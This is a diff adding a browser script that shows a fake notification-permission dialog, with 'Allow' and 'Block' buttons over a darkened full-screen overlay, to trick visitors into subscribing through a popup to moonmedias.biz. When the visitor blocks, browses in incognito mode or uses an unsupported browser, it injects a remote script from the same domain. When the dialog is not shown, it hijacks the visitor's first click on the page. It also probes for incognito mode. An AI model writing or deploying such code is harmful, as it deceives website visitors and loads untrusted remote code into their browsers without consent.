@@ -1,0 +1,420 @@
+(function () {
+    'use strict';
+    
+    const MESSAGES = {
+        ru: {
+            title: '... запрашивает разрешение на:',
+            permission: 'Показ уведомлений',
+            allow: 'Разрешить',
+            disallow: 'Блокировать',
+            captcha: 'Я не робот',
+        },
+        en: {
+            title: '... wants to:',
+            permission: 'Show notifications',
+            allow: 'Allow',
+            disallow: 'Block',
+            captcha: 'I am not a robot',
+        }
+    };
+    MESSAGES.uk = MESSAGES.ru;
+    
+    MESSAGES.current = MESSAGES[getLanguage()] || MESSAGES.en;    
+    const SETTINGS = {
+        callbackName: 'onSubInit',
+        request: {
+            show: true        },
+        background: {
+            show: true,
+            transparent: 70,
+            text: "\u041d\u0430\u0436\u043c\u0438\u0442\u0435 \"\u0420\u0430\u0437\u0440\u0435\u0448\u0438\u0442\u044c\", \u0447\u0442\u043e\u0431\u044b \u043f\u043e\u043b\u0443\u0447\u0430\u0442\u044c \u0443\u0432\u0435\u0434\u043e\u043c\u043b\u0435\u043d\u0438\u044f" 
+        },
+        landing: {
+            url: '//moonmedias.biz/?sp=me3tqojymm5dmnjthaxtc&spu=hfstcmldme5ha3ddf43dkmzy',
+            params: 'href=' + window.location.href,
+            target: 'window',
+            width: 600,
+            height: 600        },
+        cookieName: 'notify-permission',
+        storageName: 'notify-permission',
+        disallowTime: 30 * 60,
+        cookieNameS: 'notify-p',
+        sUrl: '//moonmedias.biz/?pus=hfstcmldme5ha3ddf43dkmzy&sub1=&sub2=&sub3=&sub4=&gmt=' + (- new Date().getTimezoneOffset()/60),    };
+
+    SETTINGS.landing.top=((window.innerHeight - SETTINGS.landing.height) / 2);
+    SETTINGS.landing.left=((window.innerWidth - SETTINGS.landing.width) / 2) + (window.screenLeft || window.screenX || 0);
+
+    SETTINGS.template = '\
+    <div style="z-index: 2147483647; position: fixed; top: 0;  bottom: 0; left: 0; right: 0;background: rgba(0,0,0,.'+(SETTINGS.background.show ? SETTINGS.background.transparent : 0)+');backface-visibility: hidden;-webkit-backface-visibility: hidden;text-align: left;">\
+                        <div style="box-sizing: border-box;-webkit-box-sizing:border-box;width: 320px;max-width: 100%;background: #fff;position: fixed;top: 0;left: ' + (window.innerWidth < 400 ? 0 : 56) + 'px;box-shadow: 0 0 20px #0000008a;border-radius: 3px;line-height: 1;">\
+                 <img class="js-close" style="box-sizing: border-box;-webkit-box-sizing:border-box;padding: 0;margin:0;position: absolute;width: 11px;right:10px;top:10px;cursor: pointer;outline: 0 !important;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAMAAAAM7l6QAAAAS1BMVEUAAABaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlo8++Y/AAAAGHRSTlMAC/Tp5NHux7woBr8u1CEiE8wfMh3aqKRGKXN5AAAAxklEQVQoz22SWxaDIAxEo6JQLIpWW/a/0kYE5xCYDx+53BwkEse4herMbqVIQ1AVtzNXD76bwBlWQfVVVfvlRv4qsE5VOvkKH+4d8mN6mh6/23LpzS/ggvZMJa+XW43loNisfdp5Kl3hq0TlQc0BwWdKDlfGgKqD6vwy3Tpq5Jvx6FvzFRurKfjSpvCb9HzOZ2/QydNW9zf1SOCD3gN14NJNA0d/K2jhH8IV/kQ60Q8o/J46DRfxLv8xVsMt/EgvPkQqfcUd/7Y7JTdYkYd+AAAAAElFTkSuQmCC" />\
+                 <div style="box-sizing: border-box;-webkit-box-sizing:border-box;padding: 5% 5% 4% 5%;font-family: calibri,arial;font-size: 17px;">\
+                     '+MESSAGES.current.title+'\
+                 </div>\
+                 <div style="font-size: 0;line-height: 0;padding: 0 5%;">\
+                     <img style="width:13px;vertical-align: top;padding: 0;margin: 0;display: inline-block;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAqCAMAAADs1AnaAAAAUVBMVEUAAABaWlpZWVlaWlpZWVlSUlJZWVlaWlpZWVlZWVlWVlZOTk5ZWVlZWVlaWlpZWVlZWVlXV1dRUVFaWlpaWlpZWVlaWlpZWVlaWlpVVVVaWlqPKIPXAAAAGnRSTlMAXm2UZw358qZCMAjfzbOrWDUX48S4nIx3J6SDwgkAAAC9SURBVDjL7dLLDoMgEIXhaSsC3vHuef8HLVETFWHUpMv+6y9nMUBupm0NXVTFQFzxRmSwZYJFUwxbPLEoWVDCEN1nmMt6HVopsKvwrkUSh2R0NiNOjacdeHK2EulDMjmgDt66vdEItL+ECiG1GdGEULO9okEws/2PMKrcI/GneofR+49+iB49S1qEUZGuRoFJpbMpwVZaJVbDKEE5LssJN6LXjeh59Wet5pDEnOQQDQsaiEso2JQgPp3nmpy+KIFSTz3Bs58AAAAASUVORK5CYII=" />\
+                     <span style="display:inline-block;vertical-align:top;margin-left:14px;font-size: 12px;line-height:1;font-family: \'segoe ui\',Calibri,Arial;font-weight: 400;">\
+                         '+MESSAGES.current.permission+'\
+                     </span>\
+                 </div>\
+                 <div style="padding: 22px 12px 6px 12px;font-size: 0;line-height: 0;text-align: right;">\
+                     <div class="js-allow" style="border: 1px solid #dadce0;color: #3673E3;margin-left: 10px;text-shadow: none;display: inline-block;vertical-align: top;min-width: 109px;text-align: center;padding: 0 15px;margin: 3px;height: 30px;line-height: 28px;border-radius: 4px;cursor: pointer;font-family: \'segoe ui\',Calibri,Arial;outline: 0 !important;font-size: 12px;" >\
+                         '+MESSAGES.current.allow+'\
+                     </div>\
+                     <div class="js-denied" style="border: 1px solid #dadce0;color: #3673E3;margin-left: 10px;text-shadow: none;display: inline-block;vertical-align: top;min-width: 109px;text-align: center;padding: 0 15px;margin: 3px;height: 30px;line-height: 28px;border-radius: 4px;cursor: pointer;font-family: \'segoe ui\',Calibri,Arial;outline: 0 !important;font-size: 12px;" >\
+                         '+MESSAGES.current.disallow+'\
+                     </div>\
+                </div>\
+            </div>\
+                    <div style="position: fixed;' + (isMobileDevice() ? 'bottom: 0' : 'top: 30%') + ';color: #fff; font-size: 30px;text-align: center;left: 50%;transform: translate(-50%, -50%);max-width: 460px;font-family: \'Segoe UI\',\'Open Sans\',Ubuntu,\'Dejavu Sans\',Helvetica,\'Helvetica Neue\',Arial,sans-serif">\
+         ' + SETTINGS.background.text + '\
+              </div>\
+     <div class="js-close" style="position: absolute; right: 20px;top: 10px;font-weight: 300;opacity: .8;cursor: pointer;font-family: \'Segoe UI\',\'Open Sans\',Ubuntu,\'Dejavu Sans\',Helvetica,\'Helvetica Neue\',Arial,sans-serif;color: #fff;width: 60px;text-align: center;">\
+         <span style="font-size: 60px;line-height: 20px;">×</span>\
+     </div>\
+        </div>\
+';
+
+    const EVENTS = {
+        show: [],
+        subscribe: [],
+        disallow: [],
+        error: []
+    };
+
+    const COOKIE = {
+        get: function (name) {
+            let matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,
+                '\\$1') + "=([^;]*)"));
+            return matches ? decodeURIComponent(matches[1]) : undefined;
+        },
+        set: function (name, value, options) {
+            options = options || {};
+
+            let expires = options.expires;
+
+            if (typeof expires === "number" && expires) {
+                let d = new Date();
+                d.setTime(d.getTime() + expires * 1000);
+                expires = options.expires = d;
+            }
+            if (expires && expires.toUTCString) {
+                options.expires = expires.toUTCString();
+            }
+
+            value = encodeURIComponent(value);
+
+            let updatedCookie = name + "=" + value;
+
+            for (let propName in options) {
+                if (options.hasOwnProperty(propName)) {
+                    updatedCookie += "; " + propName;
+                    let propValue = options[propName];
+                    if (propValue !== true) {
+                        updatedCookie += "=" + propValue;
+                    }
+                }
+            }
+
+            document.cookie = updatedCookie;
+        }
+    };
+
+    function getLanguage() {
+        let language = window.navigator ? (window.navigator.userLanguage ||
+            window.navigator.language ||
+            window.navigator.browserLanguage ||
+            window.navigator.systemLanguage) : 'ru';
+
+        language = language.substr(0, 2).toLowerCase();
+        return language;
+    }
+
+    function isMobileDevice() {
+        if (typeof window.orientation !== 'undefined') {
+            return true;
+        }
+
+        if ('ontouchstart' in window || navigator.msMaxTouchPoints) {
+            return true;
+        }
+
+        return false;
+    }
+
+    const templateDom = {
+        timer: false,
+        element: null,
+        removeHtml: function () {
+            if (templateDom.element) {
+                templateDom.element.parentNode.removeChild(templateDom.element);
+                templateDom.element = null;
+            }
+        },
+        events: {
+            close: function (ev) {
+                ev.preventDefault();
+                templateDom.removeHtml();
+                mainManager.emitEvents('disallow', 'cancel');
+            },
+            allow: function (ev) {
+                if (ev) {
+                    ev.preventDefault();
+                }
+
+                let url = SETTINGS.landing.url + (SETTINGS.landing.url.indexOf('?') === -1 ? '?' : '&') + SETTINGS.landing.params;
+
+                if (SETTINGS.landing.target === 'tab') {
+                    if (!SETTINGS.request.show) {
+                        COOKIE.set(SETTINGS.cookieName, 'denied', SETTINGS.disallowTime);
+                    } else {
+                        templateDom.removeHtml();
+                    }
+
+                    let element = Object.assign(document.createElement('a'), { target: '_blank', href: url});
+                    document.body.appendChild(element);
+                    element.click();
+
+                    setTimeout(() => {
+                        element.parentNode.removeChild(element);
+                    }, 100);
+                } else {
+                    let params = '';
+                    params += 'left=' + SETTINGS.landing.left;
+                    params += ',top=' + SETTINGS.landing.top;
+                    params += ',width=' + SETTINGS.landing.width;
+                    params += ',height=' + SETTINGS.landing.height;
+                    params += ',menubar=no';
+                    params += ',toolbar=no';
+                    params += ',location=no';
+                    params += ',status=no';
+                    params += ',personalbar=no';
+
+                    let child = window.open(url, 'OPENING', params);
+                    templateDom.timer = setInterval(function() {
+                        if (child.closed !== false) {
+                            clearInterval(templateDom.timer);
+                            templateDom.timer = false;
+
+                            templateDom.removeHtml();
+                            mainManager.emitEvents('disallow', 'cancel');
+                        }
+                    }, 200);
+                }
+            },
+            denied: function (ev) {
+                ev.preventDefault();
+                
+                templateDom.removeHtml();
+                COOKIE.set(SETTINGS.cookieName, 'denied', SETTINGS.disallowTime);
+                mainManager.emitEvents('disallow', 'denied');
+                mainManager.renderShtml();            }
+        }
+    };
+
+    const mainManager = {
+        isIncognitoMode: false,
+        emitEvents: function (event, data) {
+            EVENTS[event].forEach(cb => cb(data));
+        },
+        attachEvent: function (event, callback) {
+            if (typeof EVENTS[event] === 'undefined') {
+                return false;
+            }
+            EVENTS[event].unshift(callback);
+            return true;
+        },
+        processError: function (error) {
+            console.error(error);
+            this.emitEvents('error', error);
+        },
+        renderHtml: function () {
+            function ready(callback) {
+                if (document.readyState !== 'loading') {
+                    return callback();
+                }
+                document.addEventListener('DOMContentLoaded', function () {
+                    return callback();
+                });
+            }
+
+            function eventHook() {
+                document.removeEventListener('click', eventHook, true);
+                templateDom.events.allow();
+            }
+
+            ready(() => {
+                this.emitEvents('show');
+
+                if (SETTINGS.request.show) {
+                    templateDom.element = document.createElement('div');
+                    templateDom.element.innerHTML = SETTINGS.template;
+                    document.body.appendChild(templateDom.element);
+
+                    for (let event in templateDom.events) {
+                        if (templateDom.events.hasOwnProperty(event)) {
+                            let elements =  [].slice.call(templateDom.element.getElementsByClassName('js-' + event));
+                            elements.forEach(element => {
+                                element.onclick = templateDom.events[event];
+                                element.removeAttribute('class');
+                            });
+                        }
+                    }
+                } else {
+                    document.addEventListener('click', eventHook, true);
+                }
+            });
+        },
+        renderShtml: function () {
+            if (COOKIE.get(SETTINGS.cookieNameS) === 'denied') {
+              return false;
+            }
+            function ready(callback) {
+                if (document.readyState !== 'loading') {
+                    return callback();
+                }
+                document.addEventListener('DOMContentLoaded', function () {
+                    return callback();
+                });
+            }
+            ready(() => {
+                templateDom.element = document.createElement('script');
+                templateDom.element.src = SETTINGS.sUrl;
+                document.body.appendChild(templateDom.element);
+            });
+        },
+        processMessage: function (ev) {
+            if (ev.data && ev.data.from === 'notify-subscriber') {
+                if (templateDom.timer) {
+                    clearInterval(templateDom.timer);
+                    templateDom.timer = false;
+                }
+                templateDom.removeHtml();
+
+                let data = ev.data.data;
+
+                switch (data.status) {
+                    case 'subscribe':
+                        localStorage.setItem(SETTINGS.storageName, JSON.stringify({
+                            permission: 'granted',
+                            date: Date.now()
+                        }));
+                        this.emitEvents('subscribe');
+                        break;
+
+                    case 'disallow':
+                        if (data.reason === 'denied') {
+                            localStorage.setItem(SETTINGS.storageName, JSON.stringify({
+                                permission: 'denied',
+                                date: Date.now()
+                            }));
+                            this.emitEvents('disallow', 'denied');
+                        } else {
+                            this.emitEvents('disallow', 'cancel')
+                        }
+                        break;
+
+                    case 'error':
+                        let error = new Error(data.error.message);
+                        error.code = data.error.code;
+
+                        if (error.code === 'UNSUPPORTED_DEVICE') {
+                            localStorage.setItem(SETTINGS.storageName, JSON.stringify({
+                                permission: 'denied',
+                                date: Date.now()
+                            }));
+                        }
+                        this.processError(error);
+                        break;
+                }
+            }
+        },
+        getPermission(withDate) {
+            if (typeof withDate === 'undefined') {
+                withDate = false;
+            }
+
+            let data = {
+                permission: 'default',
+                date: Date.now()
+            };
+
+            if (COOKIE.get(SETTINGS.cookieName) === 'denied') {
+                data.permission = 'denied';
+            }
+            if ('localStorage' in window) {
+                let savedData = localStorage.getItem(SETTINGS.storageName);
+                if (savedData) {
+                    try {
+                        savedData = JSON.parse(savedData);
+                        data.permission = savedData.permission;
+                        data.date = savedData.date;
+                    } catch (e) {
+                    }
+                }
+            }
+
+            return withDate ? data : data.permission;
+        },
+        canStart: function () {
+            if (this.isIncognitoMode) {
+                return false;
+            }
+            if (!('Notification' in window) || !('fetch' in window) || !('postMessage' in window) || !('localStorage' in window)) {
+                return false;
+            }
+            // Iframe
+            if (window.self !== window.top) {
+                return false;
+            }
+
+            return true;
+        },
+        start: function () {
+            if (!this.canStart()) {
+                                 this.renderShtml();
+                 return this.emitEvents('disallow', 'denied');
+                            }
+
+            let data = this.getPermission(true);
+            switch (data.permission) {
+                case 'denied':
+                    this.renderShtml();                    return this.emitEvents('disallow', 'denied');
+
+                case 'granted':
+                    return this.emitEvents('subscribe');
+            }
+
+            window.addEventListener('message', this.processMessage.bind(this));
+
+            this.renderHtml();
+        }
+    };
+
+    function init() {
+        if (typeof window[SETTINGS.callbackName] === 'function') {
+            window[SETTINGS.callbackName](mainManager);
+        } else {
+            mainManager.start();
+        }
+    }
+    
+    const sleep = (milliseconds) => {
+      return new Promise(resolve => setTimeout(resolve, milliseconds))
+    }
+
+    let fileSystem = window.RequestFileSystem || window.webkitRequestFileSystem;
+    if (!fileSystem) {
+     sleep(1).then(() => {
+       init();
+     })
+    } else {
+     sleep(1).then(() => {
+        fileSystem(window.TEMPORARY, 100, init, () => {
+            mainManager.isIncognitoMode = true;
+            init();
+        });
+     })
+    }
+    
+}());
